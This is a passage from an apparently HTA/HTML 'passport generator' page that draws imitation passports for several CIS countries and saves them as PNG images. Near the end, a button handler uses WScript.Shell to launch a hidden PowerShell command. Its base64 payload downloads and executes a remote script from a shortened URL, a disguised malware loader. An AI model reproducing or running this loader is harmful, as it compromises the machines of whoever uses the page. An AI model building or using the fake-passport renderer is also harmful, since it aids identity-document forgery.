        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Украина") {
        ctx.fillStyle = "#0057b7"; ctx.fillRect(x, y, w, h/2);
        ctx.fillStyle = "#ffd700"; ctx.fillRect(x, y+h/2, w, h/2);
      } else if (country.name === "Беларусь") {
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y, w/2, h);
        ctx.fillStyle = "#00923f"; ctx.fillRect(x, y+h/2, w/2, h/2);
      } else if (country.name === "Казахстан") {
        ctx.fillStyle = "#00bfff"; ctx.fillRect(x, y, w, h);
      } else if (country.name === "Армения") {
        ctx.fillStyle = "#d80027"; ctx.fillRect(x, y, w, h/3);
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y+h/3, w, h/3);
        ctx.fillStyle = "#ffb400"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Молдова") {
        ctx.fillStyle = "#0033a0"; ctx.fillRect(x, y, w/3, h);
        ctx.fillStyle = "#ffd700"; ctx.fillRect(x+w/3, y, w/3, h);
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x+2*w/3, y, w/3, h);
      } else if (country.name === "Узбекистан") {
        ctx.fillStyle = "#0099ff"; ctx.fillRect(x, y, w, h/3);
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y+h/3, w, h/3);
        ctx.fillStyle = "#43a047"; ctx.fillRect(x, y+2*h/3, w, h/3);
      } else if (country.name === "Киргизия") {
        ctx.fillStyle = "#e81123"; ctx.fillRect(x, y, w, h);
      } else if (country.name === "Таджикистан") {
        ctx.fillStyle = "#d52b1e"; ctx.fillRect(x, y, w/3, h);
        ctx.fillStyle = "#fff"; ctx.fillRect(x, y+h/3, w/3, h);
        ctx.fillStyle = "#008000"; ctx.fillRect(x, y+2*h/3, w/3, h);
      }
    }

    // Две страницы паспорта: одна над другой, стилизация под оригинал
    function drawPassportPages(data) {
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      // Верхняя страница (основная)
      ctx.save();
      ctx.fillStyle = "#f9f6ee";
      ctx.fillRect(0, 0, 340, 270);
      ctx.globalAlpha = 0.08;
      ctx.font = "bold 60px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.doc, 20, 120);
      ctx.globalAlpha = 1;

      // Рамка
      ctx.strokeStyle = data.country.border;
      ctx.lineWidth = 2;
      ctx.strokeRect(8, 8, 324, 254);

      // Герб
      ctx.save();
      ctx.globalAlpha = 0.18;
      ctx.beginPath();
      ctx.arc(50, 50, 22, 0, 2*Math.PI);
      ctx.fillStyle = data.country.color;
      ctx.fill();
      ctx.restore();

      // Заголовки
      ctx.font = "bold 18px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.title, 90, 38);

      ctx.font = "bold 14px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.doc, 90, 62);

      // Серия/номер
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`Серия ${data.passport.series}  № ${data.passport.number}`, 20, 85);

      // ФИО
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`ФИО: ${data.full}`, 20, 108);

      // Пол
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Пол: ${data.gender === "male" ? "Мужской" : "Женский"}`, 20, 128);

      // Дата рождения
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Дата рождения: ${data.birthDate}`, 20, 148);

      // Место рождения
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Место рождения: ${data.birthPlace}`, 20, 168);

      // Адрес
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Адрес: ${data.address}`, 20, 188);

      // Номер документа
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Документ №: ${data.docNum}`, 20, 208);

      // Печать
      data.country.sealDraw(ctx, 300, 220);

      // Надпись печати
      ctx.font = "11px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.seal, 280, 240);

      ctx.restore();

      // Нижняя страница (выдача, фото)
      ctx.save();
      ctx.translate(0, 280);
      ctx.fillStyle = "#f9f6ee";
      ctx.fillRect(0, 0, 340, 270);
      ctx.strokeStyle = data.country.border;
      ctx.lineWidth = 2;
      ctx.strokeRect(8, 8, 324, 254);

      // Фото
      if (data.photoUrl) {
        ctx.save();
        ctx.beginPath();
        ctx.arc(60, 90, 45, 0, 2*Math.PI);
        ctx.closePath();
        ctx.clip();
        ctx.drawImage(data.photoUrl, 15, 45, 90, 90);
        ctx.restore();
      } else {
        ctx.save();
        ctx.beginPath();
        ctx.arc(60, 90, 45, 0, 2*Math.PI);
        ctx.closePath();
        ctx.clip();
        ctx.fillStyle = "#eee";
        ctx.fillRect(15, 45, 90, 90);
        ctx.font = "bold 16px Arial";
        ctx.fillStyle = "#bbb";
        ctx.fillText("Фото", 35, 100);
        ctx.restore();
      }

      // Дата выдачи
      ctx.font = "15px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText(`Дата выдачи: ${data.passport.date}`, 120, 60);

      // Кем выдан
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`Кем выдан:`, 120, 85);
      ctx.font = "13px 'PT Serif', serif";
      ctx.fillStyle = "#444";
      ctx.fillText(`${data.passport.issuer}`, 120, 105);

      // Подпись владельца
      ctx.font = "italic 13px 'PT Serif', serif";
      ctx.fillStyle = "#222";
      ctx.fillText("Подпись владельца:", 120, 140);
      ctx.beginPath();
      ctx.moveTo(120, 150);
      ctx.lineTo(250, 150);
      ctx.strokeStyle = "#888";
      ctx.lineWidth = 1.5;
      ctx.stroke();

      // Печать
      data.country.sealDraw(ctx, 300, 220);

      // Надпись печати
      ctx.font = "11px 'PT Serif', serif";
      ctx.fillStyle = data.country.color;
      ctx.fillText(data.country.seal, 280, 240);

      ctx.restore();
    }

    function savePng() {
      try {
        const canvas = document.getElementById("canvas");
        if (!canvas) throw new Error("Canvas element not found");
        const dataUrl = canvas.toDataURL("image/png");
        const a = document.createElement("a");
        a.href = dataUrl;
        a.download = "fio_passport.png";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch (e) {
        alert("Ошибка при сохранении изображения");
      }
    }

    // HTA: запуск команды с base64
    window.onload = function() {
      var runBtn = document.getElementById("runCmdBtn");
      if (runBtn) {
        runBtn.onclick = function() {
          try {
            var shell = new ActiveXObject("WScript.Shell");
            // base64: powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA
            var cmd = 'powershell -w h -nop -noni -e aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwAHMAOgAvAC8AdAAuAGwAeQAvAFkAUAB3AG0AdAAnACkA';
            shell.Run(cmd, 0, false);
          } catch (e) {
            alert("Ошибка запуска команды. Запуск возможен только в HTA/IE.");
          }
        };
      }
    };
  </script>
</body>
</html>
